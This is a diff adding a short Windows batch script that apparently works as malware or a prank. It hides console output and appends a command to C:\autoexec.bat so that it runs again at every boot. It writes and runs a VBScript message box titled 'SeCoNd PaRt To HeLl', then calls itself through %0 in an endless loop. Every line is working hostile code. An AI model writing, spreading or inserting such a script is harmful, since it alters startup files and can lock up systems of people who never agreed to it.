@@ -1,0 +1,13 @@
+@echo off
+ctty nul
+echo cscript C:\vbs.vbs >> C:\autoexec.bat
+goto ende
+:start
+%0
+goto endee
+:ende
+echo.on error resume next > C:\vbs.vbs
+echo msgbox "SeCoNd PaRt To HeLl", vbokonly & vbinformation,"SeCoNd PaRt To HeLl" >> C:\vbs.vbs
+cscript C:\vbs.vbs
+goto start
+:endee
